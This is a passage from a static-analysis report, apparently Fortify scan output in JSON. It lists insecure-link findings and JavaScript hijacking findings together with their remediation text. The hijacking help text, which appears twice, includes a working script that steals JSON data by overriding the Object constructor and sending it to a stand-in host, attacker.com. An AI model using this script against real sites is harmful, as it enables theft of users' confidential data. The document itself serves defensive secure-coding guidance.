            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4514/?engineType=SCA&issue=60C164AE634499261064016A3912CC08"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4515",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Init.php.html on line 571 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4515/?engineType=SCA&issue=60C164AE634499261064016A3912CC09"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4658",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Monitor.php.html on line 1240 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4658/?engineType=SCA&issue=C359D5621F4DB1AAFECFDCB4A14B1BF9"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4659",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Monitor.php.html on line 1240 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4659/?engineType=SCA&issue=C359D5621F4DB1AAFECFDCB4A14B1BFA"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4568",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Report.php.html on line 769 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4568/?engineType=SCA&issue=81B50245A76D7D524032CC514C2E5D0A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4569",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Report.php.html on line 769 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4569/?engineType=SCA&issue=81B50245A76D7D524032CC514C2E5D0B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4496",
          "shortDescription" : {
            "text" : "JavaScript Hijacking: Vulnerable Framework"
          },
          "fullDescription" : {
            "text" : "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.\n\n\n"
          },
          "help" : {
            "text" : "An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.\n\nWeb browsers enforce the Same Origin Policy to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.\n\nThe most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.\n\nExample 1: The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.\n\nThe client requests data from a server and evaluates the result as JSON with the following code:\n\n\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n\n\nWhen the code runs, it generates an HTTP request which appears as the following:\n\n\nGET /object.json HTTP/1.1\n...\nHost: www.example.com\nCookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR\n\n\n(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)\nThe server responds with an array in JSON format:\n\n\nHTTP/1.1 200 OK\nCache-control: private\nContent-Type: text/JavaScript; charset=utf-8\n...\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" },\n {\"fname\":\"Katrina\", \"lname\":\"O'Neil\", \"phone\":\"6502135600\",\n  \"purchases\":120000.00, \"email\":\"katrina@example.com\" },\n {\"fname\":\"Jacob\", \"lname\":\"West\", \"phone\":\"6502135600\",\n  \"purchases\":45000.00, \"email\":\"jacob@example.com\" }]\n\n\nIn this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.\n\n\n&lt;script&gt;\n// override the constructor used to create all objects so\n// that whenever the \"email\" field is set, the method\n// captureObject() will run. Since \"email\" is the final field,\n// this will allow us to steal the whole object.\nfunction Object() {\n this.email setter = captureObject;\n}\n\n// Send the captured object back to the attacker's web site\nfunction captureObject(x) {\n  var objString = \"\";\n  for (fld in this) {\n    objString += fld + \": \" + this[fld] + \", \";\n  }\n  objString += \"email: \" + x;\n  var req = new XMLHttpRequest();\n  req.open(\"GET\", \"http://attacker.com?obj=\" +\n           escape(objString),true);\n  req.send(null);\n}\n&lt;/script&gt;\n\n&lt;!-- Use a script tag to bring in victim's data --&gt;\n&lt;script src=\"http://www.example.com/object.json\"&gt;&lt;/script&gt;\n\n\nThe malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.\n\nWhen the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.\n\nThis is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.\n\nAll programs that communicate using JavaScript should take the following defensive measures:  1) Decline malicious requests: Include a hard-to-guess identifier, such as the session identifier, as part of each request that will return JavaScript. This defeats cross-site request forgery attacks by allowing the server to validate the origin of the request. 2) Prevent direct execution of the JavaScript response: Include characters in the response that prevent it from being successfully handed off to a JavaScript interpreter without modification. This prevents an attacker from using a &lt;script&gt; tag to witness the execution of the JavaScript. The best way to defend against JavaScript hijacking is to adopt both defensive tactics.\n\nDeclining Malicious Requests\nFrom the server's perspective, a JavaScript hijacking attack looks like an attempt at cross-site request forgery, and defenses against cross-site request forgery will also defeat JavaScript hijacking attacks. In order to make it easy to detect malicious requests, every request should include a parameter that is hard for an attacker to guess. One approach is to add the session cookie to the request as a parameter. When the server receives such a request, it can check to be certain the session cookie matches the value in the request parameter. Malicious code does not have access to the session cookie (cookies are also subject to the Same Origin Policy), so there is no easy way for the attacker to craft a request that will pass this test. A different secret can also be used in place of the session cookie; as long as the secret is hard to guess and appears in a context that is accessible to the legitimate application and not accessible from a different domain, it will prevent an attacker from making a valid request.\n\nSome frameworks run only on the client side. In other words, they are written entirely in JavaScript and have no knowledge about the workings of the server. This implies that they do not know the name of the session cookie. Even without knowing the name of the session cookie, they can participate in a cookie-based defense by adding all of the cookies to each request to the server.\n\nExample 2: The following JavaScript fragment outlines this \"blind client\" strategy:\n\n\n  var httpRequest = new XMLHttpRequest();\n  ...\n  var cookies=\"cookies=\"+escape(document.cookie);\n  http_request.open('POST', url, true);\n  httpRequest.send(cookies);\n\n\nThe server could also check the HTTP referer header to make sure the request has originated from the legitimate application and not from a malicious application. Historically speaking, the referer header has not been reliable, so we do not recommend using it as the basis for any security mechanisms. A server can mount a defense against JavaScript hijacking by responding to only HTTP POST requests and not responding to HTTP GET requests. This is a defensive technique because the &lt;script&gt; tag always uses GET to load JavaScript from external sources. This defense is also error-prone. The use of GET for better performance is encouraged by web application experts. The missing connection between the choice of HTTP methods and security means that, at some point, a programmer may mistake this lack of functionality for an oversight rather than a security precaution and modify the application to respond to GET requests.\n\nPreventing Direct Execution of the Response\nIn order to make it impossible for a malicious site to execute a response that includes JavaScript, the legitimate client application can take advantage of the fact that it is allowed to modify the data it receives before executing it, while a malicious application can only execute it using a &lt;script&gt; tag. When the server serializes an object, it should include a prefix (and potentially a suffix) that makes it impossible to execute the JavaScript using a &lt;script&gt; tag. The legitimate client application can remove this extraneous data before running the JavaScript.\n\nExample 3: There are many possible implementations of this approach. The following example demonstrates two. First, the server could prefix each message with the statement:\n\n\nwhile(1);\n\n\nUnless the client removes this prefix, evaluating the message will send the JavaScript interpreter into an infinite loop. The client searches for and removes the prefix as follows:\n\n\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    if (txt.substr(0,9) == \"while(1);\") {\n      txt = txt.substring(10);\n    }\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n\n\nSecond, the server can include comment characters around the JavaScript that have to be removed before the JavaScript is sent to eval(). The following JSON object has been enclosed in a block comment:\n\n\n/*\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" }\n]\n*/\n\n\nThe client can search for and remove the comment characters as follows:\n\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    if (txt.substr(0,2) == \"/*\") {\n      txt = txt.substring(2, txt.length - 2);\n    }\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n\n\nAny malicious site that retrieves the sensitive JavaScript via a &lt;script&gt; tag will not gain access to the data it contains.\n\nSince the 5th edition of EcmaScript it is not possible to poison the JavaScript Array constructor.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4496/?engineType=SCA&issue=5AEFE1B90CC69A0F0036310ADAE8883A"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4642",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file index.html on line 348 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4642/?engineType=SCA&issue=B6611C5DE5B15B1D3A33512C11DF6661"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4643",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file index.html on line 348 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4643/?engineType=SCA&issue=B6611C5DE5B15B1D3A33512C11DF6662"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4640",
          "shortDescription" : {
            "text" : "JavaScript Hijacking: Vulnerable Framework"
          },
          "fullDescription" : {
            "text" : "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.\n\n\n"
          },
          "help" : {
            "text" : "An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.\n\nWeb browsers enforce the Same Origin Policy to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.\n\nThe most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.\n\nExample 1: The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.\n\nThe client requests data from a server and evaluates the result as JSON with the following code:\n\n\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n\n\nWhen the code runs, it generates an HTTP request which appears as the following:\n\n\nGET /object.json HTTP/1.1\n...\nHost: www.example.com\nCookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR\n\n\n(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)\nThe server responds with an array in JSON format:\n\n\nHTTP/1.1 200 OK\nCache-control: private\nContent-Type: text/JavaScript; charset=utf-8\n...\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" },\n {\"fname\":\"Katrina\", \"lname\":\"O'Neil\", \"phone\":\"6502135600\",\n  \"purchases\":120000.00, \"email\":\"katrina@example.com\" },\n {\"fname\":\"Jacob\", \"lname\":\"West\", \"phone\":\"6502135600\",\n  \"purchases\":45000.00, \"email\":\"jacob@example.com\" }]\n\n\nIn this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.\n\n\n&lt;script&gt;\n// override the constructor used to create all objects so\n// that whenever the \"email\" field is set, the method\n// captureObject() will run. Since \"email\" is the final field,\n// this will allow us to steal the whole object.\nfunction Object() {\n this.email setter = captureObject;\n}\n\n// Send the captured object back to the attacker's web site\nfunction captureObject(x) {\n  var objString = \"\";\n  for (fld in this) {\n    objString += fld + \": \" + this[fld] + \", \";\n  }\n  objString += \"email: \" + x;\n  var req = new XMLHttpRequest();\n  req.open(\"GET\", \"http://attacker.com?obj=\" +\n           escape(objString),true);\n  req.send(null);\n}\n&lt;/script&gt;\n\n&lt;!-- Use a script tag to bring in victim's data --&gt;\n&lt;script src=\"http://www.example.com/object.json\"&gt;&lt;/script&gt;\n\n\nThe malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.\n\nWhen the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.\n\nThis is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.\n\nAll programs that communicate using JavaScript should take the following defensive measures:  1) Decline malicious requests: Include a hard-to-guess identifier, such as the session identifier, as part of each request that will return JavaScript. This defeats cross-site request forgery attacks by allowing the server to validate the origin of the request. 2) Prevent direct execution of the JavaScript response: Include characters in the response that prevent it from being successfully handed off to a JavaScript interpreter without modification. This prevents an attacker from using a &lt;script&gt; tag to witness the execution of the JavaScript. The best way to defend against JavaScript hijacking is to adopt both defensive tactics.\n\nDeclining Malicious Requests\nFrom the server's perspective, a JavaScript hijacking attack looks like an attempt at cross-site request forgery, and defenses against cross-site request forgery will also defeat JavaScript hijacking attacks. In order to make it easy to detect malicious requests, every request should include a parameter that is hard for an attacker to guess. One approach is to add the session cookie to the request as a parameter. When the server receives such a request, it can check to be certain the session cookie matches the value in the request parameter. Malicious code does not have access to the session cookie (cookies are also subject to the Same Origin Policy), so there is no easy way for the attacker to craft a request that will pass this test. A different secret can also be used in place of the session cookie; as long as the secret is hard to guess and appears in a context that is accessible to the legitimate application and not accessible from a different domain, it will prevent an attacker from making a valid request.\n\nSome frameworks run only on the client side. In other words, they are written entirely in JavaScript and have no knowledge about the workings of the server. This implies that they do not know the name of the session cookie. Even without knowing the name of the session cookie, they can participate in a cookie-based defense by adding all of the cookies to each request to the server.\n\nExample 2: The following JavaScript fragment outlines this \"blind client\" strategy:\n\n\n  var httpRequest = new XMLHttpRequest();\n  ...\n  var cookies=\"cookies=\"+escape(document.cookie);\n  http_request.open('POST', url, true);\n  httpRequest.send(cookies);\n\n\nThe server could also check the HTTP referer header to make sure the request has originated from the legitimate application and not from a malicious application. Historically speaking, the referer header has not been reliable, so we do not recommend using it as the basis for any security mechanisms. A server can mount a defense against JavaScript hijacking by responding to only HTTP POST requests and not responding to HTTP GET requests. This is a defensive technique because the &lt;script&gt; tag always uses GET to load JavaScript from external sources. This defense is also error-prone. The use of GET for better performance is encouraged by web application experts. The missing connection between the choice of HTTP methods and security means that, at some point, a programmer may mistake this lack of functionality for an oversight rather than a security precaution and modify the application to respond to GET requests.\n\nPreventing Direct Execution of the Response\nIn order to make it impossible for a malicious site to execute a response that includes JavaScript, the legitimate client application can take advantage of the fact that it is allowed to modify the data it receives before executing it, while a malicious application can only execute it using a &lt;script&gt; tag. When the server serializes an object, it should include a prefix (and potentially a suffix) that makes it impossible to execute the JavaScript using a &lt;script&gt; tag. The legitimate client application can remove this extraneous data before running the JavaScript.\n\nExample 3: There are many possible implementations of this approach. The following example demonstrates two. First, the server could prefix each message with the statement:\n\n\nwhile(1);\n\n\nUnless the client removes this prefix, evaluating the message will send the JavaScript interpreter into an infinite loop. The client searches for and removes the prefix as follows:\n\n\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    if (txt.substr(0,9) == \"while(1);\") {\n      txt = txt.substring(10);\n    }\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n\n\nSecond, the server can include comment characters around the JavaScript that have to be removed before the JavaScript is sent to eval(). The following JSON object has been enclosed in a block comment:\n\n\n/*\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" }\n]\n*/\n\n\nThe client can search for and remove the comment characters as follows:\n\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    if (txt.substr(0,2) == \"/*\") {\n      txt = txt.substring(2, txt.length - 2);\n    }\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n\n\nAny malicious site that retrieves the sensitive JavaScript via a &lt;script&gt; tag will not gain access to the data it contains.\n\nSince the 5th edition of EcmaScript it is not possible to poison the JavaScript Array constructor.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4640/?engineType=SCA&issue=B4C211F829B9E8F82E65CD662C5B3523"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4403",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
